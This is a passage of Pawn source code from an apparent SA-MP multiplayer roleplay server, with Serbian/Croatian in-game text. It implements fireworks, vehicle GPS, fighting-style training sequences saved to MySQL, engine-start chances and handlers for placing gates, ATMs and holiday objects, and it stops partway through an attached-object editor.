_:public KickIgraca(playerid)
{
	Kick(playerid);
	return 1;
}
//------------------------------------------------------------------------------
stock CreateFireWork(id, Float:x, Float:y, Float:z, shots)
{
    FireWork[id][fw_step] = 0;
    FireWork[id][fw_max] = (shots < 1) ? 1 : shots;

    FireWork[id][fw_mainobj][0] = CreateDynamicObject(2709, x, y, z-0.8, 0.0, 0.0, 0.0);
    FireWork[id][fw_mainobj][1] = CreateDynamicObject(18728, x, y, z-2.3, 0.0, 0.0, 0.0);
    FireWork[id][fw_mainobj][2] = CreateDynamicObject(354, x, y, z-2.3, 0.0, 0.0, 0.0);

    FireWork[id][fw_x] = x;
    FireWork[id][fw_y] = y;
    FireWork[id][fw_z] = z;

    FireWork[id][fw_timer] = SetTimerEx_("fireworkrepeat", 5000, 5000, 1, "i", id);

    Iter_Add(iter_FireWork, id);
    return 1;
}

stock DestroyFireWork(id)
{
	Iter_Remove(iter_FireWork, id);
    KillTimer(FireWork[id][fw_timer]);

    for(new i = 0; i < 4; i++) 
    {
        DestroyDynamicObject(FireWork[id][fw_mainobj][i]);
    }
    return 1;
}

GetXYInFrontOfPlayer(playerid, &Float:x, &Float:y, Float:distance)
{
    new Float:a;
    GetPlayerPos(playerid, x, y, a);
    GetPlayerFacingAngle(playerid, a);
    if(GetPlayerVehicleID(playerid)) 
    {
        GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
    }
    x += (distance * floatsin(-a, degrees));
    y += (distance * floatcos(-a, degrees));
}

_:public firework(id)
{
    new Float:x, Float:y, Float:z;

    GetDynamicObjectPos(FireWork[id][fw_mainobj][2], x, y, z);
    DestroyDynamicObject(FireWork[id][fw_mainobj][2]);
    DestroyDynamicObject(FireWork[id][fw_mainobj][3]);
    CreateExplosion(x, y, z, 11, 10.0);

    CreateFireWorkExplosion(id, x, y, z, random(5));
    return 1;
}

_:public fireworkrepeat(id)
{
    FireFireWork(id);
    return 1;
}

stock FireFireWork(id)
{
    for(new i; i < MAX_EXPLOSION_OBJS; i++)
    {
        if(IsValidDynamicObject(FireWork[id][fw_obj][i])) 
        {
            DestroyDynamicObject(FireWork[id][fw_obj][i]);
        }
    }

    DestroyDynamicObject(FireWork[id][fw_mainobj][2]);
    DestroyDynamicObject(FireWork[id][fw_mainobj][3]);
    FireWork[id][fw_mainobj][2] = CreateDynamicObject(354, FireWork[id][fw_x], FireWork[id][fw_y], FireWork[id][fw_z]-2.3, 0.0, 0.0, 0.0);
    FireWork[id][fw_mainobj][3] = CreateDynamicObject(18715, FireWork[id][fw_x], FireWork[id][fw_y], FireWork[id][fw_z]-2.3, 0.0, 0.0, 0.0);

    new Float:x, Float:y, Float:z;
    GetDynamicObjectPos(FireWork[id][fw_mainobj][2], x, y, z);

    new direction = random(20);
    MoveDynamicObject(FireWork[id][fw_mainobj][2], x + ((direction < 10) ? (-float(direction)) : (float(direction))), y + ((direction < 10) ? (-float(direction)) : (float(direction))), z + 65.0, 25.0);
    MoveDynamicObject(FireWork[id][fw_mainobj][3], x + ((direction < 10) ? (-float(direction)) : (float(direction))), y + ((direction < 10) ? (-float(direction)) : (float(direction))), z + 65.0, 25.0);
    CreateExplosion(x, y, z-1.0, 12, 5.0);

    SetTimerEx_("firework", 2500, 2500, 1, "i", id);
    return 1;
}

stock CreateFireWorkExplosion(id, Float:x, Float:y, Float:z, type = FW_TYPE_RAINBOW)
{
    new Float:nx, Float:ny, Float:ra, Float:nz, Float:speed, r;

    for(new i = 0; i < MAX_EXPLOSION_OBJS; i++) 
    {
        switch(type) 
        {
            case FW_TYPE_RAINBOW: 
            {
                r = random(sizeof(array_objects));
                FireWork[id][fw_obj][i] = CreateDynamicObject(array_objects[r], x, y, z, 0.0, 0.0, 0.0, .drawdistance = 600.0);
            }
            case FW_TYPE_BLUE: 
            {
                if(i % 3) FireWork[id][fw_obj][i] = CreateDynamicObject(array_objects[3], x, y, z, 0.0, 0.0, 0.0, .drawdistance = 600.0);
                else FireWork[id][fw_obj][i] = CreateDynamicObject(array_objects[0], x, y, z, 0.0, 0.0, 0.0, .drawdistance = 600.0);
            }
            case FW_TYPE_GREEN: 
            {
                if(i % 3) FireWork[id][fw_obj][i] = CreateDynamicObject(array_objects[2], x, y, z, 0.0, 0.0, 0.0, .drawdistance = 600.0);
                else FireWork[id][fw_obj][i] = CreateDynamicObject(array_objects[0], x, y, z, 0.0, 0.0, 0.0, .drawdistance = 600.0);
            }
            case FW_TYPE_RED: 
            {
                if(i % 3) FireWork[id][fw_obj][i] = CreateDynamicObject(array_objects[1], x, y, z, 0.0, 0.0, 0.0, .drawdistance = 600.0);
                else FireWork[id][fw_obj][i] = CreateDynamicObject(array_objects[0], x, y, z, 0.0, 0.0, 0.0, .drawdistance = 600.0);
            }
            case FW_TYPE_WHITE: 
            {
                if(i % 3) FireWork[id][fw_obj][i] = CreateDynamicObject(array_objects[0], x, y, z, 0.0, 0.0, 0.0, .drawdistance = 600.0);
                else FireWork[id][fw_obj][i] = CreateDynamicObject(array_objects[0], x, y, z, 0.0, 0.0, 0.0, .drawdistance = 600.0);
            }
            default: 
            {
                r = random(sizeof(array_objects));
                FireWork[id][fw_obj][i] = CreateDynamicObject(array_objects[r], x, y, z, 0.0, 0.0, 0.0, .drawdistance = 600.0);
            }
        }

        switch(i) 
        {
            case 0..4: 
            {
                ra = floatdiv(360.0, 5.0);

                nx = (x + 6.0 * floatsin(-ra*i,degrees));
                ny = (y + 6.0 * floatcos(-ra*i,degrees));

                nz = 12.0;
                speed = 12.0;
            }
            case 5..10: 
            {
                ra = floatdiv(360.0, 6.0);

                nx = (x + 9.0 * floatsin(-ra*i,degrees));
                ny = (y + 9.0 * floatcos(-ra*i,degrees));

                nz = 7.0;
                speed = 11.0;
            }
            case 11..18: 
            {
                ra = floatdiv(360.0, 8.0);

                nx = (x + 12.0 * floatsin(-ra*i,degrees));
                ny = (y + 12.0 * floatcos(-ra*i,degrees));

                nz = 0.0;
                speed = 9.0;
            }
            case 19..24: 
            {
                ra = floatdiv(360.0, 6.0);

                nx = (x + 9.0 * floatsin(-ra*i,degrees));
                ny = (y + 9.0 * floatcos(-ra*i,degrees));

                nz = -7.0;
                speed = 11.0;
            }
            case 25..29: 
            {
                ra = floatdiv(360.0, 5.0);

                nx = (x + 6.0 * floatsin(-ra*i,degrees));
                ny = (y + 6.0 * floatcos(-ra*i,degrees));

                nz = -12.0;
                speed = 12.0;
            }
        }

        MoveDynamicObject(FireWork[id][fw_obj][i], nx, ny, z + (nz), speed);
    }

    foreach(new i : Player)
    {
        Streamer_Update(i);
    }

    FireWork[id][fw_step] ++;

    if(FireWork[id][fw_step] <= FireWork[id][fw_max]) 
    {
        FireWork[id][fw_timer] = SetTimerEx_("fireworkrepeat", 1500, 1500, 1, "i", id);
    } 
    else 
    {
        KillTimer(FireWork[id][fw_timer]);

        for(new i = 0; i < MAX_EXPLOSION_OBJS; i++) 
        {
            if(IsValidDynamicObject(FireWork[id][fw_obj][i])) 
            {
                DestroyDynamicObject(FireWork[id][fw_obj][i]);
            }
        }
        DestroyFireWork(id);
    }
    return 1;
}
//------------------------------------------------------------------------------
_:public GPSConnect( playerid, gpslvl, vehicleid)
{
 	if(gpslvl == 1)
  	{
  		new TmpZone[MAX_ZONE_NAME];
		GetVehicleZone( vehicleid, TmpZone, sizeof(TmpZone));
		SCMF( playerid, 0xE2C058FF, "(VOZILO): Vase vozilo je u cetvrti: {FFFFFF}%s", TmpZone);

		new Float:x,Float:y,Float:z;
		GetVehiclePos( vehicleid, x, y, z);

		SMG_SetPlayerCheckpoint( playerid, x, y, z, 5.0);
  		CheckpointStatus[ playerid ] = 1;
    	LocatingCar[playerid] = true;
     	GPSTimerCalled[playerid] = false;

		GameTextForPlayer( playerid, "~g~gps aktiviran", 3000, 1);
  	}
	return 1;
}
//------------------------------------------------------------------------------
_:public BoxTrain(playerid)
{
	switch(Training[playerid])
	{
		case 0:
		{
			SMG_TogglePlayerControllable( playerid, false );
			SMG_SetPlayerPos( playerid, 768.1064,14.3897,1000.6992);
			SetPlayerFacingAngle( playerid, 266.8890);
			SetPlayerCameraPos( playerid, 765.4290,8.6809,1000.7123);
			SetPlayerCameraLookAt( playerid, 768.1064,14.3897,1000.6992);
			ApplyAnimation( playerid,"GYMNASIUM","GYMshadowbox",4.1,1,1,1,1,9500);
			SetPlayerTimerEx(playerid, "BoxTrain", 10000, false, "i", playerid);
			Training[ playerid ]  = 1;
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~Training... ~n~~l~] ] ]",10000,3);
		}
		case 1:
		{
		   	SetPlayerCameraPos( playerid, 771.5601,11.3144,1000.7026);
			SetPlayerCameraLookAt( playerid, 768.1064,14.3897,1000.6992);
			ApplyAnimation( playerid,"GYMNASIUM","GYMshadowbox",4.1,1,1,1,1,14500);
			SetPlayerTimerEx(playerid, "BoxTrain", 15000, false, "i", playerid);
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~Training... ~n~~y~] ~l~] ]",15000,3);
			Training[ playerid ]  = 2;
		}
		case 2:
		{
			BussinesMoney( uFirmi[ playerid ], 2000, true );
			SetPlayerCameraPos( playerid, 772.9484,-0.2051,1000.7241);
			SetPlayerCameraLookAt( playerid, 768.1064,14.3897,1000.6992);
			ApplyAnimation( playerid,"GYMNASIUM","GYMshadowbox",4.1,1,1,1,1,19500);
			SetPlayerTimerEx(playerid, "BoxTrain", 20000, false, "i", playerid);
			Training[ playerid ]  = 3;
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~Training... ~n~~y~] ] ~l~]",20000,3);
		}
		case 3:
		{
		    SMG_TogglePlayerControllable( playerid, true );
			SetCameraBehindPlayer( playerid );
			ClearAnimations( playerid );
			SendClientMessage( playerid, 0x4282C0FF, "(TERETANA): Zavrsio si svoj trening, i naucio borbeni stil Boxing.");
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Finished! ~n~~y~] ] ]",10000,3);
	  		SetPlayerFightingStyle ( playerid, FIGHT_STYLE_BOXING);
			PlayerInfo[ playerid ][ xBStil ] = 1;
		    Training[ playerid ]  = 0;

		    new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `fight_style` = '%d' WHERE `user_id` = '%d' LIMIT 1",
												PlayerInfo[ playerid ][ xBStil ],
												PlayerInfo[ playerid ][ xID ] );
			mysql_tquery( mSQL, q );
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public KungTrain( playerid )
{
	switch(Training[playerid])
	{
	    case 0:
		{
			SMG_TogglePlayerControllable( playerid, false );
			SMG_SetPlayerPos( playerid, 772.6890,5.4252,1000.7802);
			SetPlayerFacingAngle( playerid, 89.2975);
			SetPlayerCameraPos( playerid, 767.2456,-0.7102,1000.7197);
			SetPlayerCameraLookAt( playerid, 772.6890,5.4252,1000.7802);
			ApplyAnimation( playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,7500);
			SetPlayerTimerEx(playerid, "KungTrain", 8000, false, "i", playerid);
			Training[ playerid ] = 1;
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Training... ~n~~l~] ] ]",10000,3);
		}
		case 1:
		{
		    SetPlayerCameraPos( playerid, 765.4534,8.1254,1000.7133);
			SetPlayerCameraLookAt( playerid, 772.6890,5.4252,1000.7802);
			ApplyAnimation( playerid,"BSKTBALL","BBALL_def_loop",4.0,1,0,0,0,12500);
			SetPlayerTimerEx(playerid, "KungTrain", 13000, false, "i", playerid);
			Training[ playerid ] = 2;
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Training... ~n~~b~] ~l~] ]",13000,3);
		}
		case 2:
		{
			BussinesMoney( uFirmi[ playerid ], 4000, true );
			SetPlayerCameraPos( playerid, 774.3497,10.2337,1000.7027);
			SetPlayerCameraLookAt( playerid, 772.6890,5.4252,1000.7802);
			ApplyAnimation( playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,17500);
			SetPlayerTimerEx(playerid, "KungTrain", 18000, false, "i", playerid);
			Training[ playerid ]  = 3;
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Training... ~n~~b~] ] ~l~]",18000,3);
		}
		case 3:
		{
		    SMG_TogglePlayerControllable( playerid, true );
			SetCameraBehindPlayer( playerid );
			ClearAnimations( playerid );
			SendClientMessage( playerid, 0x4282C0FF, "(TRENING): Zavrsio si svoj trening, i naucio borbeni stil Kung Fu-a.");
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Finished! ~n~~b~] ] ]",10000,3);
			SetPlayerFightingStyle ( playerid, FIGHT_STYLE_KUNGFU);
			PlayerInfo[ playerid ][ xBStil ] = 2;
			Training[ playerid ]  = 0;

			new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `fight_style` = '%d' WHERE `user_id` = '%d' LIMIT 1",
												PlayerInfo[ playerid ][ xBStil ],
												PlayerInfo[ playerid ][ xID ] );
			mysql_tquery( mSQL, q );
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public GrabTrain( playerid )
{
    switch(Training[playerid])
	{
	    case 0:
		{
			SMG_TogglePlayerControllable( playerid, false );
			SMG_SetPlayerPos( playerid, 767.1951,-2.5557,1000.7187);
			SetPlayerFacingAngle( playerid, 172.0182);
			SetPlayerCameraPos( playerid, 772.6243,-0.1576,1000.7242);
			SetPlayerCameraLookAt( playerid, 767.1951,-2.5557,1000.7187);
			ApplyAnimation( playerid,"GANGS","shake_carSH",4.0,1,0,0,0,8500);
			SetPlayerTimerEx(playerid, "GrabTrain", 8000, false, "i", playerid);
			Training[ playerid ]  = 1;
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~Training... ~n~~l~] ] ]",9000,3);
		}
		case 1:
		{
		    SetPlayerCameraPos( playerid, 763.0099,2.6098,1001.5942);
			SetPlayerCameraLookAt( playerid, 767.1951,-2.5557,1000.7187);
			ApplyAnimation( playerid,"GANGS","shake_cara",4.0,1,0,0,0,13500);
			SetPlayerTimerEx(playerid, "GrabTrain", 14000, false, "i", playerid);
			Training[ playerid ]  = 2;
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~Training... ~n~~p~] ~l~] ]",14000,3);
		}
		case 2:
		{
			BussinesMoney( uFirmi[ playerid ], 6000, true );
			SetPlayerCameraPos( playerid, 769.8934,8.1243,1000.7101);
			SetPlayerCameraLookAt( playerid, 767.1951,-2.5557,1000.7187);
			ApplyAnimation( playerid,"FIGHT_D","FightD_G",4.0,1,0,0,0,18500);
			SetPlayerTimerEx(playerid, "GrabTrain", 19000, false, "i", playerid);
			Training[ playerid ]  = 3;
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~Training... ~n~~p~] ] ~l~]",19000,3);
		}
		case 3:
		{
		    SMG_TogglePlayerControllable( playerid, true );
			SetCameraBehindPlayer( playerid );
			ClearAnimations( playerid );
			SendClientMessage( playerid, 0x4282C0FF, "(TRENING): Zavrsio si svoj trening, i naucio borbeni stil Grab'n'Kick.");
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Finished! ~n~~p~] ] ]",10000,3);
	  		SetPlayerFightingStyle ( playerid, FIGHT_STYLE_GRABKICK);
			PlayerInfo[ playerid ][ xBStil ] = 4;
		    Training[ playerid ]  = 0;

		    new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `fight_style` = '%d' WHERE `user_id` = '%d' LIMIT 1",
												PlayerInfo[ playerid ][ xBStil ],
												PlayerInfo[ playerid ][ xID ] );
			mysql_tquery( mSQL, q );
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public KneeTrain( playerid )
{
	switch(Training[playerid])
	{
	    case 0:
		{
			SMG_TogglePlayerControllable( playerid, false );
			SMG_SetPlayerPos( playerid, 772.4446,5.4702,1000.7802);
			SetPlayerFacingAngle( playerid, 89.8261);
			SetPlayerCameraPos( playerid, 764.1777,5.6911,1000.7161);
			SetPlayerCameraLookAt( playerid, 772.4446,5.4702,1000.7802);
			ApplyAnimation( playerid,"GYMNASIUM","GYMshadowbox",4.0,1,1,1,1,29500);
			SetPlayerTimerEx(playerid, "KneeTrain", 30000, false, "i", playerid);
			Training[ playerid ]  = 1;
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~Training... ~n~~l~] ] ]",30000,3);
		}
		case 1:
		{
		    SetPlayerCameraPos( playerid, 770.2583,-2.5223,1000.7255);
			SetPlayerCameraLookAt( playerid, 772.4446,5.4702,1000.7802);
			ApplyAnimation( playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,34500);
			SetPlayerTimerEx(playerid, "KneeTrain", 35000, false, "i", playerid);
			Training[ playerid ]  = 2;
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~Training... ~n~~r~] ~l~] ]",35000,3);
		}
		case 2:
		{
			BussinesMoney( uFirmi[ playerid ], 8000, true );
			SetPlayerCameraPos( playerid, 765.2747,12.5178,1000.7049);
			SetPlayerCameraLookAt( playerid, 772.4446,5.4702,1000.7802);
			ApplyAnimation( playerid,"BSKTBALL","BBALL_Dnk",4.0,1,0,0,0,36500);
			SetPlayerTimerEx(playerid, "KneeTrain", 40000, false, "i", playerid);
			Training[ playerid ]  = 3;
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~Training... ~n~~r~] ] ~l~]",37000,3);
		}
		case 3:
		{
		    SMG_TogglePlayerControllable( playerid, true );
			SetCameraBehindPlayer( playerid );
			ClearAnimations( playerid );
			SendClientMessage( playerid, 0x4282C0FF, "(TRENING): Zavrsio si svoj trening, i naucio borbeni stil KneeHead.");
			GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Finished! ~n~~r~] ] ]",10000,3);
		    SetPlayerFightingStyle ( playerid, FIGHT_STYLE_KNEEHEAD);
			PlayerInfo[ playerid ][ xBStil ] = 3;
		    Training[ playerid ]  = 0;

		    new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `fight_style` = '%d' WHERE `user_id` = '%d' LIMIT 1",
												PlayerInfo[ playerid ][ xBStil ],
												PlayerInfo[ playerid ][ xID ] );
			mysql_tquery( mSQL, q );
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public VehicleEngineStart( playerid )
{
        new engine,lights,alarm,doors,bonnet,boot,objective,
    		vehicle = GetPlayerVehicleID( playerid ),
            Float:vHealth,
            RandomStart;

        RandomStart = random(10);
		GetVehicleHealth(vehicle, vHealth);
		StartingVehicle[playerid] = false;

		if(vHealth >= 800 && vHealth <= 1000)
		{
    		switch( RandomStart )
			{
    	    	case 0..8:
			 	{
					//vEngine[vehicle] = ON;
				 	SendClientMessage( playerid, 0xE2C058FF, "(VOZILO): Uspesno ste pokrenuli motor.");
				 	SMG_TogglePlayerControllable( playerid, true );
				 	GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
            		SetVehicleParamsEx(vehicle,1,lights,alarm,doors,bonnet,boot,objective);
			 	}
			 	case 9: SendClientMessage( playerid, 0xE2C058FF, "(VOZILO): Niste uspjeli pokrenuti motor.");
			}
		}
		else if(vHealth >= 500 && vHealth <= 799)
		{
    	 	switch(RandomStart)
    	 	{
    	    	case 0..7:
			 	{
					//vEngine[vehicle] = ON;
				 	SendClientMessage( playerid, 0xE2C058FF, "(VOZILO): Uspesno ste pokrenuli motor.");
				 	SMG_TogglePlayerControllable( playerid, true );
				 	GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
            		SetVehicleParamsEx(vehicle,1,lights,alarm,doors,bonnet,boot,objective);
			 	}
			 	case 8,9: SendClientMessage( playerid, 0xE2C058FF, "(VOZILO): Niste uspjeli pokrenuti motor.");
			}
		}
		else if(vHealth >= 351 && vHealth <= 499)
		{
            switch(RandomStart)
    	 	{
    	    	case 0..5:
			 	{
				 	//vEngine[vehicle] = ON;
				 	SendClientMessage( playerid, 0xE2C058FF, "(VOZILO): Uspesno ste pokrenuli motor.");
				 	SMG_TogglePlayerControllable( playerid, true );
				 	GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
            		SetVehicleParamsEx(vehicle,1,lights,alarm,doors,bonnet,boot,objective);
			 	}
			 	case 6..9: SendClientMessage( playerid, 0xE2C058FF, "(VOZILO): Niste uspjeli pokrenuti motor.");
			}
		}
		return 1;
}
//------------------------------------------------------------------------------
public OnPlayerEditDynamicObject(playerid, objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	new Float:oldX, Float:oldY, Float:oldZ, Float:oldRotX, Float:oldRotY, Float:oldRotZ;
	GetObjectPos(objectid, oldX, oldY, oldZ);
	GetObjectRot(objectid, oldRotX, oldRotY, oldRotZ);

	if( response == EDIT_RESPONSE_FINAL )
	{
		if(EditRoadblock[playerid] != -1)
		{
			new rb = EditRoadblock[playerid];

		    Roadblocks[ rb ][ sX ] = x;
		    Roadblocks[ rb ][ sY ] = y;
		    Roadblocks[ rb ][ sZ ] = z;

			SendInfoMessage(playerid, "Uspjesno si namjestio blokadu/spike.");

			EditRoadblock[playerid] = -1;
			return 1;
		}
		if( EditDGate[ playerid ] != -1 )
		{
		    new g = EditDGate[ playerid ];

		    GateData[ g ][ gatePos ][ 0 ] = x;
			GateData[ g ][ gatePos ][ 1 ] = y;
			GateData[ g ][ gatePos ][ 2 ] = z;
			GateData[ g ][ gatePos ][ 3 ] = rx;
			GateData[ g ][ gatePos ][ 4 ] = ry;
			GateData[ g ][ gatePos ][ 5 ] = rz;

			SendInfoMessage( playerid, "Uspesno sacuvana pozicija zatvorene kapije. Sada sacuvajte poziciju otvorene kapije.");

            EditDynamicObject( playerid, GateData[ g ][ gateObject ] );

			EditDGate[ playerid ] = -1;
			EditDGateMove[ playerid ] = g;
		    return 1;
		}
		if( EditDGateMove[ playerid ] != -1 )
		{
		    new g = EditDGateMove[ playerid ];

		    GateData[ g ][ gateMove ][ 0 ] = x;
			GateData[ g ][ gateMove ][ 1 ] = y;
			GateData[ g ][ gateMove ][ 2 ] = z;
			GateData[ g ][ gateMove ][ 3 ] = rx;
			GateData[ g ][ gateMove ][ 4 ] = ry;
			GateData[ g ][ gateMove ][ 5 ] = rz;

			SendInfoMessage( playerid, "Uspesno sacuvana pozicija otvorene kapije.");
			ShowPlayerDialog( playerid, dialog_CREATEGATE_2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}Unesite brzinu zatvaranja i otvaranja kapije (0 > 20.0).", "Potvrdi", "Nazad" );
		    DestroyDynamicObject( GateData[ g ][ gateObject ] );
		    GateData[ g ][ gateObject ] = CreateDynamicObject( GateData[ g ][ gateModel ], GateData[ g ][ gatePos ][ 0 ], GateData[ g ][ gatePos ][ 1 ], GateData[ g ][ gatePos ][ 2 ], GateData[ g ][ gatePos ][ 3 ], GateData[ g ][ gatePos ][ 4 ], GateData[ g ][ gatePos ][ 5 ], GateData[ g ][ gateWorld ], GateData[ g ][ gateInterior ] );

			EditDGate[ playerid ] = g;
			EditDGateMove[ playerid ] = -1;
		    return 1;
		}
		if( EditKontejnera[ playerid ] != -1 )
		{
		    new i = EditKontejnera[ playerid ];
		   	DestroyDynamicObject( KontInfo[ i ][ koObjID ] );

		   	KontInfo[ i ][ koObjPos ][ 0 ] = x;
    		KontInfo[ i ][ koObjPos ][ 1 ] = y;
    		KontInfo[ i ][ koObjPos ][ 2 ] = z;
    		KontInfo[ i ][ koObjRot ][ 0 ] = rx;
    		KontInfo[ i ][ koObjRot ][ 1 ] = ry;
    		KontInfo[ i ][ koObjRot ][ 2 ] = rz;
			KontInfo[ i ][ koObjID ] = CreateDynamicObject(1345, x, y, z, rx, ry, rz);
			SacuvajKont( i );

			EditKontejnera[ playerid ] = -1;
			return 1;
		}
		if( EditATM[ playerid ] != -1 )
		{
		    new i = EditATM[ playerid ];
		   	DestroyDynamicObject( atmInfo[ i ][ atmObject ] );

		   	atmInfo[ i ][ atmPos ][ 0 ] = x;
    		atmInfo[ i ][ atmPos ][ 1 ] = y;
    		atmInfo[ i ][ atmPos ][ 2 ] = z;
    		atmInfo[ i ][ atmPos ][ 3 ] = rx;
    		atmInfo[ i ][ atmPos ][ 4 ] = ry;
    		atmInfo[ i ][ atmPos ][ 5 ] = rz;
    		atmInfo[ i ][ atmPreseceneZice ] = false;
			atmInfo[ i ][ atmProbijenBios ] = false;
			atmInfo[ i ][ atmVremeDoRoba ] = 0;
			atmInfo[ i ][ atmObject ] = CreateDynamicObject(2942, x, y, z, rx, ry, rz);
			SacuvajATM( i );

			atmInfo[ i ][ atmText3D ] = CreateDynamic3DTextLabel( "ATM\n\n\
																   Da koristite bankomat kucajte {FFFFFF}\"/atm\"\n\
																   {4282C0}Da opljackate bankomat kucajte {FFFFFF}\"/robatm\"", 0x4282C0FF, atmInfo[ i ][atmPos][ 0 ], atmInfo[ i ][atmPos][ 1 ], atmInfo[ i ][atmPos][ 2 ], 10.0, IPI, IVI, 0, -1, -1 );

			EditATM[ playerid ] = -1;
			return 1;
		}
		if( EditPresents[ playerid ] != -1 )
		{
		    new i = EditPresents[ playerid ];
		   	DestroyDynamicObject( presentsInfo[ i ][ presObject ] );

            new object = 19054;
			new rand = random( 5 );
		    switch( rand )
			{
				case 0: object = 19054;
				case 1: object = 19055;
				case 2: object = 19056;
				case 3: object = 19057;
				case 4: object = 19058;
			}

		   	presentsInfo[ i ][ presPos ][ 0 ] = x;
    		presentsInfo[ i ][ presPos ][ 1 ] = y;
    		presentsInfo[ i ][ presPos ][ 2 ] = z;
    		presentsInfo[ i ][ presPos ][ 3 ] = rx;
    		presentsInfo[ i ][ presPos ][ 4 ] = ry;
    		presentsInfo[ i ][ presPos ][ 5 ] = rz;
    		presentsInfo[ i ][ presPlaced ] = true;
			presentsInfo[ i ][ presTaken ] = false;
			presentsInfo[ i ][ presObject ] = CreateDynamicObject( object, x, y, z, rx, ry, rz);
			SavePresent( i );

			presentsInfo[ i ][ pres3d ] = CreateDynamic3DTextLabel( "Paketici\n{FFFFFF}Ovaj paketic nije otvoren.\n\n{00FF00}Da otvorite paketic kucajte\n{FFFFFF}\"/poklon\"", 0x00FF00FF, presentsInfo[ i ][ presPos ][ 0 ], presentsInfo[ i ][ presPos ][ 1 ], presentsInfo[ i ][ presPos ][ 2 ], 10.0, IPI, IVI, 0, -1, -1, .priority = 26 );

			EditPresents[ playerid ] = -1;
			return 1;
		}
		if( EditCTrees[ playerid ] != -1 )
		{
		    new i = EditCTrees[ playerid ];
		   	DestroyDynamicObject( CTree[ i ][ ctObject ] );

		   	CTree[ i ][ ctPos ][ 0 ] = x;
    		CTree[ i ][ ctPos ][ 1 ] = y;
    		CTree[ i ][ ctPos ][ 2 ] = z;
    		CTree[ i ][ ctPos ][ 3 ] = rx;
    		CTree[ i ][ ctPos ][ 4 ] = ry;
    		CTree[ i ][ ctPos ][ 5 ] = rz;
    		CTree[ i ][ ctPlaced ] = true;
			CTree[ i ][ ctObject ] = CreateDynamicObject(19076, x, y, z, rx, ry, rz);
			mSQL_CreateTrees( i );
			Iter_Add(iter_CTree, i);

			CTree[ i ][ ct3d ] = CreateDynamic3DTextLabel("Novogodisnja Jelkica\n{FFFFFF}Zelimo Vam srecne Bozicne i novogodisnje praznike!\n\n{6EF83C}*** 2020 ***", 0x6EF83CFF, CTree[ i ][ ctPos ][ 0 ], CTree[ i ][ ctPos ][ 1 ], CTree[ i ][ ctPos ][ 2 ]+1.5, 5.0, IPI, IVI, 0, -1, -1 );

			EditCTrees[ playerid ] = -1;
			return 1;
		}
	}
	//-------------------
	if( response == EDIT_RESPONSE_CANCEL )
	{
	}
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerEditAttachedObject( playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
    if( response )
	{
        if( EditingBody[ playerid ] )
		{
            if( fScaleX > 2.0 || fScaleY > 2.0 || fScaleZ > 2.0 )
			{
                switch( (chosen_clothes_slot[ playerid ]-1) )
				{
                    case 0: EditAttachedObject( playerid, OBJECT_SLOT_1 );
                    case 1: EditAttachedObject( playerid, OBJECT_SLOT_2 );
                    case 2: EditAttachedObject( playerid, OBJECT_SLOT_3 );
                    case 3: EditAttachedObject( playerid, OBJECT_SLOT_4 );
                }
	            SendErrorMessage( playerid, "Losa pozicija objekta odradi je ponovo." );
	            return 1;
	        }
	        switch( (chosen_clothes_slot[ playerid ]-1) )
			{
	            case 0:
				{
					clothes_info[ playerid ][ x_slot_1_pos ][ 0 ] = fOffsetX;
					clothes_info[ playerid ][ x_slot_1_pos ][ 1 ] = fOffsetY;
					clothes_info[ playerid ][ x_slot_1_pos ][ 2 ] = fOffsetZ;
					clothes_info[ playerid ][ x_slot_1_pos ][ 3 ] = fRotX;
					clothes_info[ playerid ][ x_slot_1_pos ][ 4 ] = fRotY;
					clothes_info[ playerid ][ x_slot_1_pos ][ 5 ] = fRotZ;
					clothes_info[ playerid ][ x_slot_1_pos ][ 6 ] = fScaleX;
					clothes_info[ playerid ][ x_slot_1_pos ][ 7 ] = fScaleY;
					clothes_info[ playerid ][ x_slot_1_pos ][ 8 ] = fScaleZ;

